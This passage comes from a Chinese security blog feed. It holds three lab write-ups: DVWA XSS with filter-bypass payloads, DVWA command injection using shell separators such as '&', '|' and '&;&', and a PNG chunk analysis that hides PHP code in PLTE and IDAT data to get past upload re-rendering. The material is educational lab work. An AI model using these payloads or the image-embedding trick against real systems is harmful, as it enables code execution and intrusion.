onload=alert(&#39;jisso&#39;)&gt;</code></p><p><code>&lt;img src=&quot;&quot; onerror=alert(&#39;lisa&#39;)&gt;</code></p><p><code>&lt;a href=&#39;&#39; onclick=alert(&#39;rose&#39;)&gt;click&lt;/a&gt;</code></p><p><code>Iframe:&lt;iframe onload=alert(gennie)&gt;</code></p><p><code>&lt;body onmousemove=alert(&#39;genius&#39;)&gt;</code></p><h2 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h2><pre><code class="hljs stata"><span class="hljs-variable">$name</span> = preg_replace( &#x27;/&lt;(.*)<span class="hljs-built_in">s</span>(.*)c(.*)<span class="hljs-built_in">r</span>(.*)<span class="hljs-built_in">i</span>(.*)p(.*)t/i&#x27;, &#x27;&#x27;, <span class="hljs-variable">$name</span> );</code></pre><p>与上一关类似，对<code>&lt;script&gt;</code>处理不同，本关用正则表达式处理，故方法与上一关相同，<code>&lt;script&gt;</code>的嵌套和大小写绕过不可用。</p><h2 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h2><p><img src="/2021/01/27/3/19.jpg" alt="19"></p><h1 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h1><p>DOM全称Doument Object Model，使用DOM可以使程序和脚本能够动态访问和更新文档的内容、结构及样式。<br>DOM型XSS其实是一种特殊的反射型XSS，它是基于DOM文档对象模型的一种漏洞。HTML的标签都是节点，而这些节点组成了DOM的整体结构——节点树。通过HTML DOM,树中的所有节点均可通过JavaScript进行访问。所有HTML元素(节点)均可被修改，也可以创建或删除节点。HTMLDOM树结构如下</p><p><img src="/2021/01/27/3/20.jpg" alt="20"></p><p>在网站页面中有许多元素，当页面到达浏览器时，浏览器会为页面创建一个顶级的Documentobject文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑，从而修改页面的元素。客户端的脚本程序可以通过DOM动态修改页面内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段。<br>攻击方式：用户请求一个经过专门设计的URL，它由攻击者提交，且包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。</p><h2 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h2><p>无任何处理，直接在url编写<code>&lt;script&gt;alert(&#39;lisa&#39;)&lt;/script&gt;</code></p><img src="/2021/01/27/3/21.jpg" alt="21" style="zoom:50%;"><h2 id="medium-2"><a href="#medium-2" class="headerlink" title="medium"></a>medium</h2><p><img src="/2021/01/27/3/22.jpg" alt="22"></p><p>相当于将<code>&lt;script&gt;</code>过滤掉，其它标签还是可以使用的<code>&lt;img  src=1  οnerrοr=(&#39;hack&#39;)&gt;</code>，并没有弹框</p><img src="/2021/01/27/3/23.jpg" alt="23" style="zoom:67%;"><p>确实插入了，但插入的代码并没有在<code>&lt;option&gt;</code>标签值中，故要构造<code>&gt;&lt;option&gt;&lt;img src=1 onerror=alert(&#39;hack&#39;)&gt;</code>来闭合，但依旧不能弹框，仔细观察发现前面还有一个<code>&lt;select&gt;</code>,故我们要构造一个独立语句打破<code>&lt;select&gt;</code>标签的限制：<code>&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&#39;hack&#39;)&gt;</code></p><img src="/2021/01/27/3/24.jpg" alt="24" style="zoom:50%;"><p>成功~</p><h2 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h2><p>白名单 ：只允许上传  French  English German  Spanish 中一个，因为URL中#号之后的内容不会被提交到服务器，故可以构造：<code>English#&lt;script&gt;alert(1)&lt;/script&gt;</code></p><h2 id="impossible-2"><a href="#impossible-2" class="headerlink" title="impossible"></a>impossible</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment"># Don&#x27;t need to do anything, protction handled on the client side</span><span class="hljs-meta">?&gt;</span></code></pre><p>保护在客户端处理，先编写测试看看</p><p><img src="/2021/01/27/3/26.jpg" alt="26"></p><p>发现输入的参数并没有进行URL解码</p><p><img src="/2021/01/27/3/25.jpg" alt="25"></p><p>故XSS漏洞不存在.</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>单是刷dvwa并不能全面了解XSS，还有一些本次靶场没用到的标签：</p><p><code>&lt;input&gt;</code></p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span>竞争焦点，从而触发onblur事件<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">onblur</span>=<span class="hljs-string">alert(</span>&quot;<span class="hljs-attr">xss</span>&quot;) <span class="hljs-attr">autofocus</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">autofocus</span>&gt;</span>通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</code></pre><p><code>&lt;details&gt;</code></p><pre><code class="hljs routeros">&lt;details <span class="hljs-attribute">ontoggle</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;使用open属性触发ontoggle事件，无需用户去触发&lt;details open <span class="hljs-attribute">ontoggle</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</code></pre><p> <code>&lt;svg&gt;</code></p><pre><code class="hljs abnf">&lt;svg onload=alert(<span class="hljs-string">&quot;xss&quot;</span>)<span class="hljs-comment">;&gt;</span></code></pre><p> <code>&lt;video&gt;</code></p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">video</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span></code></pre><p> <code>&lt;audio&gt;</code></p><pre><code class="hljs routeros">&lt;audio <span class="hljs-attribute">src</span>=x  <span class="hljs-attribute">onerror</span>=alert(&quot;xss&quot;);&gt;</code></pre><p><code>&lt;textarea&gt;</code></p><pre><code class="hljs abnf">&lt;textarea onfocus=alert(<span class="hljs-string">&quot;xss&quot;</span>)<span class="hljs-comment">; autofocus&gt;</span></code></pre><p>还有绕过方法:</p><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>用<code>/</code>代替空格</p><pre><code class="hljs abnf">&lt;img/src=<span class="hljs-string">&quot;x&quot;</span>/onerror=alert(<span class="hljs-string">&quot;xss&quot;</span>)<span class="hljs-comment">;&gt;</span></code></pre><h3 id="字符拼接"><a href="#字符拼接" class="headerlink" title="字符拼接"></a>字符拼接</h3><p>利用eval</p><pre><code class="hljs autohotkey">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</code></pre><p>利用top</p><pre><code class="hljs markdown"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span>top[<span class="hljs-string">&quot;al&quot;+&quot;ert&quot;</span>](<span class="hljs-link">`xss`</span>);<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><ul><li>Unicode编码绕过</li><li>url编码绕过</li><li>Ascii码绕过</li><li>hex绕过</li><li>八进制</li><li>base64绕过</li></ul><h3 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h3><p>当括号被过滤的时候可以使用throw来绕过</p><h3 id="过滤url地址"><a href="#过滤url地址" class="headerlink" title="过滤url地址"></a>过滤url地址</h3><h4 id="使用url编码"><a href="#使用url编码" class="headerlink" title="使用url编码"></a>使用url编码</h4><pre><code class="hljs xquery">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror<span class="hljs-built_in">=document</span>.location=`http://<span class="hljs-meta">%77</span><span class="hljs-meta">%77</span><span class="hljs-meta">%77</span><span class="hljs-meta">%2e</span><span class="hljs-meta">%62</span><span class="hljs-meta">%61</span><span class="hljs-meta">%69</span><span class="hljs-meta">%64</span><span class="hljs-meta">%75</span><span class="hljs-meta">%2e</span><span class="hljs-meta">%63</span><span class="hljs-meta">%6f</span><span class="hljs-meta">%6d</span>/`&gt;</code></pre><h4 id="使用IP"><a href="#使用IP" class="headerlink" title="使用IP"></a>使用IP</h4><ul><li>十进制IP</li><li>八进制IP</li><li>hex</li><li>html标签中用<code>//</code>可以代替<code>http://</code></li></ul><p>详见：<a href="https://xz.aliyun.com/t/4067">XSS</a></p><p>结束~~</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||Command Injection</title>
    <link href="/2021/01/26/dvwa4/"/>
    <url>/2021/01/26/dvwa4/</url>
    
    <content type="html"><![CDATA[<p>命令注入攻击的常见场景为：仅仅需要输入数据的场合，攻击者构造数据同时输入了恶意命令代码，而系统对此并未过滤，恶意命令代码一并执行，最终导致信息泄露或者正常数据的破坏；PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一。命令注入和代码注入不同，代码注入的目的在于将外部代码注入应用程序本身，并随程序执行；命令攻击的对象是服务器的宿主机。因此用户可以通过构造特殊的输入来达到入侵目的。</p><p>先介绍一下<code>ping</code>:</p><p>Ping是潜水艇人员的专用术语，表示回应的声纳脉冲，在网络中Ping是TCP/IP工具。是用来检测网络的连通情况和分析网络速度。</p><p><img src="/2021/01/26/dvwa4/3.jpg" alt="3"></p><p>ping返回信息的含义</p><table><thead><tr><th>返回信息</th><th>分析</th></tr></thead><tbody><tr><td>Request timed out</td><td>(1)对方已关机，或者网络上没有这个地址                                                                                    (2)对方与本机不在同一网段内                                                                                                 (3)对方确实存在，但设置了ICMP数据包过滤(比如防火墙设置)，可以用带参数 -a 的Ping命令探测对方，如果能得到对方的<code>NETBIOS</code>名称，则说明对方是存在的，有防火墙设置，如果得不到就如(1),(2)                                                                                          (4)错误设置IP地址(TCP/IP设置中，设置了一个与网卡IP地址处于同一子网的IP地址)</td></tr><tr><td>Destination host Unreachable</td><td>(1)对方与本机不在同一网段内，而本机未设置默认的路由                                        　(2) 网线 出了故障                                                                                                                                  <strong>本回应与<code>time out</code>的区别：<code>timeout</code>：所经过的路由器的路由表中具有到达目标的路由，而目标因为其他原因不可到达，本回应：路由表中连到达目标的路由都没有</strong></td></tr><tr><td>Bad IP address</td><td>这个信息表示您可能没有连接到DNS服务器，所以无法解析这个IP地址，也可能是IP地址不存在。</td></tr><tr><td>Source quench received</td><td>对方或中途的服务器繁忙无法回应</td></tr><tr><td>Unknown host</td><td>该远程主机的名字不能被域名服务器(DNS)转换成IP地址。可能是域名服务器有故障，或者其名字不正确，或者网络管理员的系统与远程主机之间的通信线路有故障</td></tr><tr><td>No answer</td><td>本地系统有一条通向中心主机的路由，但却接收不到它发给中心主机的任何信息。原因可能是：中心主机没有工作;本地或中心主机网络配置不正确;本地或中心的路由器没有工作;通信线路有故障;中心主机存在路由选择问题</td></tr><tr><td>no rout to host</td><td>网卡工作不正常</td></tr><tr><td>transmit fai led，error code</td><td>10043网卡驱动不正常</td></tr><tr><td>unknown host name</td><td>DNS配置不正确</td></tr></tbody></table><p>详情：<a href="https://blog.csdn.net/hezeyujiang/article/details/79504038">ping命令详解</a></p><p>输入ip，程序调用系统命令ping这个ip。在ip后面加<code>&amp;&amp;、&amp;、|、||</code>命令拼接符号再跟上自己需要执行的系统命令就构成了命令注入</p><table><thead><tr><th align="center">A&amp;B</th><th align="center">A&amp;&amp;B</th><th align="center">A|B</th><th align="center">A||B</th></tr></thead><tbody><tr><td align="center">AB之间无制约关系</td><td align="center">A执行成功才执行B</td><td align="center">A的输出作为B的输出</td><td align="center">A执行失败才执行B</td></tr></tbody></table><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>源码出现了一个函数：<code>stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; )</code></p><p><code>stristr() </code>函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，返回 FALSE。</p><p>格式：</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">stristr</span><span class="hljs-params">(string,search,before_search)</span></span></code></pre><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定被搜索的字符串。</td></tr><tr><td align="left"><em>search</em></td><td align="left">必需。规定要搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。</td></tr><tr><td align="left"><em>before_search</em></td><td align="left">可选。默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 <em>search</em> 参数第一次出现之前的字符串部分。</td></tr></tbody></table><p><code>php_uname()</code>:</p><p>返回运行php的操作系统的相关描述，本关参数mode可取：<code>a</code>包含所有模式</p><table><thead><tr><th align="center">s</th><th align="center">n</th><th align="center">r</th><th align="center">v</th><th align="center">m</th></tr></thead><tbody><tr><td align="center">操作系统名称</td><td align="center">主机名</td><td align="center">版本</td><td align="center">版本信息</td><td align="center">机器类型</td></tr></tbody></table><p>从源码来看，本关对ip参数并未做任何的过滤。</p><p>先测试一下本地端</p><p><img src="/2021/01/26/dvwa4/1.jpg" alt="1"></p><p><code>bytes</code>：数据包大小，也就是字节</p><p><code>time</code>值：响应往返时间，这个时间越小，说明连接这个地址速度越快。</p><p><code>TTL</code>值：<code>Time To Live</code>,表示DNS记录在DNS服务器上存在的时间，它是IP协议包的一个值，告诉路由器该数据包何时需要被丢弃。可以通过Ping返回的TTL值大小，粗略地判断目标系统类型是Windows系列还是UNIX/Linux系列,<strong>通常情况下，Linux系统的TTL值为64或255，WindowsNT/2000/XP系统的TTL值为128，Windows98系统的TTL值为32，UNIX主机的TTL值为255</strong>，上图为Linux下的测试结果。</p><p><code>Sent</code>发送多个秒包、</p><p><code>Received </code>收到多个回应包</p><p><code>Lost </code>丢弃了多少个包，<code>lost=0</code>时即为网络状态良好</p><p>响应时间<code>Minmum</code> 最小值、<code>MAXimun </code>最大值、<code>Average </code>平均值</p><p>测看看它能不能执行任意命令:<code>127.0.0.1&amp;&amp;echo 小天才</code></p><img src="/2021/01/26/dvwa4/2.jpg" alt="2" style="zoom:80%;"><p>看来是可以的。本关并无过滤，执行其他命令皆可</p><h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><pre><code class="hljs php">$substitutions = <span class="hljs-keyword">array</span>( <span class="hljs-string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, ）；</code></pre><p>源码中执行了以上过滤操作，跟黑名单差不多，可使用<code>&amp;</code>,<code>&amp;;&amp;</code>( <code>;</code>会被替换为空字符,故执行后又会变成<code>&amp;&amp;</code>)</p><h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><pre><code class="hljs php">$substitutions = <span class="hljs-keyword">array</span>( <span class="hljs-string">&#x27;&amp;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;|  &#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;$&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;||&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>, );</code></pre><p>本关只是把黑名单的范围扩大了。但仔细观察可以发现<code>&#39;|  &#39; =&gt; &#39;&#39;</code>中|后面有一个空格，所以<code>|</code>并没有被过滤。</p><h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><p>分析源码：</p><p>熟悉的<code>Anti-CSRF token </code>不再介绍，源码中还进行如下限制</p><pre><code class="hljs arcade"><span class="hljs-comment">// Check IF each octet is an integer </span> <span class="hljs-keyword">if</span>( ( is_numeric( <span class="hljs-symbol">$octet</span>[<span class="hljs-number">0</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-symbol">$octet</span>[<span class="hljs-number">1</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-symbol">$octet</span>[<span class="hljs-number">2</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-symbol">$octet</span>[<span class="hljs-number">3</span>] ) ) &amp;&amp; ( sizeof( <span class="hljs-symbol">$octet</span> ) == <span class="hljs-number">4</span> ) ) &#123;      <span class="hljs-comment">// If all 4 octets are int&#x27;s put the IP back together. </span>     <span class="hljs-symbol">$target</span> = <span class="hljs-symbol">$octet</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-symbol">$octet</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-symbol">$octet</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-symbol">$octet</span>[<span class="hljs-number">3</span>];</code></pre><p>只有数字.数字.数字.数字的格式才行。相当于黑名单。</p><p> <code>stripslashes()</code>：删除字符串string中的反斜杠</p><p><code>is_numeric()</code>和<code>explode()</code>在之前的SQL注入模块都讲过了，不再赘述。</p><p>发现每个模块的impossible里似乎都有这几个家伙。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>虽然此漏洞很厉害，可以直接执行系统命令，但这个漏洞应该不常见（毕竟这么明显，又能让用户执行cmd）</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>二次渲染&amp;&amp;png结构分析</title>
    <link href="/2021/01/24/png/"/>
    <url>/2021/01/24/png/</url>
    
    <content type="html"><![CDATA[<h2 id="一-PNG的文件结构"><a href="#一-PNG的文件结构" class="headerlink" title="一.PNG的文件结构"></a>一.PNG的文件结构</h2><h4 id="数据块构成结构"><a href="#数据块构成结构" class="headerlink" title="数据块构成结构"></a>数据块构成结构</h4><p>png定义了两种类型的数据块</p><blockquote><p>关键数据块(critical chunk)//关键数据块定义了4个标准数据块，每个PNG文件都必须包含它们，PNG读写软件也都必须要支持这些数据块。</p></blockquote><blockquote><blockquote><ul><li>PNG标识符</li><li>PNG数据块(IHDR)</li><li>PNG数据块(其他类型数据块)</li><li>PNG结尾数据块(IEND)</li></ul></blockquote></blockquote><blockquote><p>辅助数据块(ancillary chunks)</p></blockquote><h4 id="PNG文件格式中的数据块"><a href="#PNG文件格式中的数据块" class="headerlink" title="PNG文件格式中的数据块"></a>PNG文件格式中的数据块</h4><table><thead><tr><th><strong>数据块符号</strong></th><th><strong>数据块名称</strong></th><th><strong>多数据块</strong></th><th><strong>可选否</strong></th><th><strong>位置限制</strong></th></tr></thead><tbody><tr><td>IHDR</td><td>文件头数据块</td><td>否</td><td>否</td><td>第一块</td></tr><tr><td>cHRM</td><td>基色和白色点数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>gAMA</td><td>图像γ数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>sBIT</td><td>样本有效位数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>PLTE</td><td>调色板数据块</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>bKGD</td><td>背景颜色数据块</td><td>否</td><td>是</td><td>在PLTE之后IDAT之前</td></tr></tbody></table><p>PS：数据块的类别还有很多，以上只是一部分。</p><h4 id="数据块结构"><a href="#数据块结构" class="headerlink" title="数据块结构"></a>数据块结构</h4><p>PNG中，每个数据块由4个部分组成，如下：</p><table><thead><tr><th><strong>名称</strong></th><th><strong>字节数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>Length (长度)</td><td>4字节</td><td>指定数据块中数据域的长度，其长度不超过(231－1)字节</td></tr><tr><td>Chunk Type Code (数据块类型码)</td><td>4字节</td><td>数据块类型码由ASCII字母(A-Z和a-z)组成的“<strong>数据块符号”</strong></td></tr><tr><td>Chunk Data (数据块数据)</td><td>可变长度</td><td>存储按照Chunk Type Code指定的数据</td></tr><tr><td>CRC (循环冗余检测)</td><td>4字节</td><td>存储用来检测是否有错误的循环冗余码</td></tr></tbody></table><p>CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的。CRC值算法：</p><p><img src="/2021/01/24/png/1.jpg" alt="1"></p><h2 id="二-PNG图像标识符"><a href="#二-PNG图像标识符" class="headerlink" title="二.PNG图像标识符"></a>二.PNG图像标识符</h2><p>PNG文件头位置由位固定的字节来描述：</p><table><thead><tr><th>十进制数</th><th>137 80 78 71 13 10 26 10</th></tr></thead><tbody><tr><td>十六进制数</td><td>89 50 4E 47 0D 0A 1A 0A</td></tr></tbody></table><p>PEG，PNG,GIF,BMP等图片都具有不同的图像标识符号，判断文件的mimeType类型，应该通过标识符,而不是通过后缀名判断，因为后缀名可以随便修改（之前upload-labs里有提到)</p><h2 id="三-数据块"><a href="#三-数据块" class="headerlink" title="三.数据块"></a>三.数据块</h2><h4 id="IHDR数据块"><a href="#IHDR数据块" class="headerlink" title="IHDR数据块"></a>IHDR数据块</h4><p>包含有PNG文件中存储的图像数据的基本信息，且作为第一个数据块出现在PNG数据流中，一个PNG数据流中只能有一个文件头数据块。文件头数据块由13字节组成，格式如下:</p><table><thead><tr><th><strong>域的名称</strong></th><th><strong>字节数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>Width</td><td>4 bytes</td><td>图像宽度，以像素为单位</td></tr><tr><td>Height</td><td>4 bytes</td><td>图像高度，以像素为单位</td></tr><tr><td>Bit depth</td><td>1 byte</td><td>图像深度：  索引彩色图像：1，2，4或8  灰度图像：1，2，4，8或16  真彩色图像：8或16</td></tr><tr><td>ColorType</td><td>1 byte</td><td>颜色类型： 0：灰度图像, 1，2，4，8或16  2：真彩色图像，8或16  3：索引彩色图像，1，2，4或8  4：带α通道数据的灰度图像，8或16  6：带α通道数据的真彩色图像，8或16</td></tr><tr><td>Compression method</td><td>1 byte</td><td>压缩方法(LZ77派生算法)</td></tr><tr><td>Filter method</td><td>1 byte</td><td>滤波器方法</td></tr><tr><td>Interlace method</td><td>1 byte</td><td>隔行扫描方法： 0：非隔行扫描  1： Adam7(由Adam M. Costello开发的7遍隔行扫描方法)</td></tr></tbody></table><h4 id="PLTE"><a href="#PLTE" class="headerlink" title="PLTE"></a>PLTE</h4><p>PLTE定义图像的调色板信息,仅与索引彩色图像有关，而且要放在图像数据块之前。它可以包含1~256个调色板信息，每一个调色板信息由3个字节组成，分别为红黄蓝，各占一个字节，0是为黑，255为最大值。调色板PLTE数据块是辅助数据块,对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数，否则PNG图像不合法。 </p><h4 id="IDAT"><a href="#IDAT" class="headerlink" title="IDAT"></a>IDAT</h4><p>图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块.IDAT存放着图像真正的数据信息。</p><h4 id="IEND"><a href="#IEND" class="headerlink" title="IEND"></a>IEND</h4><p>标记PNG文件或者数据流已经结束，放在文件的尾部。文件的结尾12个字符总是<code>00 00 00 00 49 45 4E 44 AE 42 60 82 </code>,IEND数据块的长度总是0，数据标识总是IEND<code>49 45 4E 44</code>（前面upload有提到）</p><p>以下分析实例：</p><img src="/2021/01/24/png/1.png" alt="1" style="zoom:50%;"><p>上图为png格式图片，十六进制分析一下</p><img src="/2021/01/24/png/2.jpg" alt="2" style="zoom:50%;"><p>前八位符合png的头文件标识。</p><img src="/2021/01/24/png/3.jpg" alt="3" style="zoom:50%;"><p>图示范围就是IHDR数据块，</p><ul><li>00 00 00 0D 说明IHDR头块长为13</li><li>49 48 44 52 IHDR标识</li><li>00 00 01 94 图像的宽，404像素</li><li>00 00 01 2E 图像的高，302像素</li><li>08 色深，2^8=256，即这是一个满色的图像</li><li>06 颜色类型，索引图像</li><li>00 PNG Spec规定此处总为0（非0值为将来使用更好的压缩方法预留），表示使压缩方法(LZ77派生算法)</li><li>00 同上</li><li>00 非隔行扫描</li><li><code>A9 94 E4 B3 </code>CRC校验</li></ul><p>接下去的数据到<code>50 4C 54 45 （PLTE标识）</code>前5个都为数据块sBIT,颜色采样率。</p><img src="/2021/01/24/png/4.jpg" alt="4" style="zoom: 33%;"><p>PLTE标识前四个为调色板信息，之后还会有<code>49 44 41 54 IDAT标识</code>,文件过大不一一找出，最后面</p><img src="/2021/01/24/png/5.jpg" alt="5" style="zoom:50%;"><p>如前面所讲。由于辅助数据块都为可选部分，可以通过删除所有的辅助数据块来减少PNG文件的大小。png介绍到这里结束，接下来回归upload-17的png二次渲染绕过。</p><h4 id="写入PLTE数据块"><a href="#写入PLTE数据块" class="headerlink" title="写入PLTE数据块"></a>写入PLTE数据块</h4><p>php底层对PLTE数据块进行了CRC校验.故可再chunk data域插入php代码,然后重新计算相应的crc值并修改。<strong>此方式只对索引彩色图像的png图片有效</strong>在选取png图片时可根据IHDR数据块的color type辨别。假设php代码为<code>&lt;?php phpinfo();?&gt;</code>进行十六进制逐个编码后为<code>3C 3F 70 68 70 20 70 68 70 69 6E 66 6F 28 29 3B 3F 3E</code>找到PLTE标识后将其后18个数据改为代码的编码，然后再计算PLTE数据块的CRC，脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">png &#x3D; open(r&#39;2.png&#39;,&#39;rb&#39;)</span><br><span class="line">a &#x3D; png.read()</span><br><span class="line">png.close()</span><br><span class="line">hexstr &#x3D; binascii.b2a_hex(a)</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39; PLTE crc &#39;&#39;&#39;</span><br><span class="line">data &#x3D;  &#39;504c5445&#39;+ re.findall(&#39;504c5445(.*?)49444154&#39;,hexstr)[0]</span><br><span class="line">crc &#x3D; binascii.crc32(data[:-16].decode(&#39;hex&#39;)) &amp; 0xffffffff</span><br><span class="line">print hex(crc)</span><br></pre></td></tr></table></figure><p>摘自<a href="https://www.zhaosimeng.cn/writeup/72.html">upload-labs</a></p><p>后将CRC值改为运行后的，将此图片上传，即可。</p><p>还有一种思路：写入IDAT数据块</p><p>直接运行脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p &#x3D; array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class="line">           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class="line">           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class="line">           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class="line">           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br><span class="line">           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class="line">           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class="line">           0x66, 0x44, 0x50, 0x33);</span><br><span class="line"></span><br><span class="line">$img &#x3D; imagecreatetruecolor(32, 32);</span><br><span class="line"></span><br><span class="line">for ($y &#x3D; 0; $y &lt; sizeof($p); $y +&#x3D; 3) &#123;</span><br><span class="line">   $r &#x3D; $p[$y];</span><br><span class="line">   $g &#x3D; $p[$y+1];</span><br><span class="line">   $b &#x3D; $p[$y+2];</span><br><span class="line">   $color &#x3D; imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y &#x2F; 3), 0, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,&#39;.&#x2F;00.png&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>摘自<a 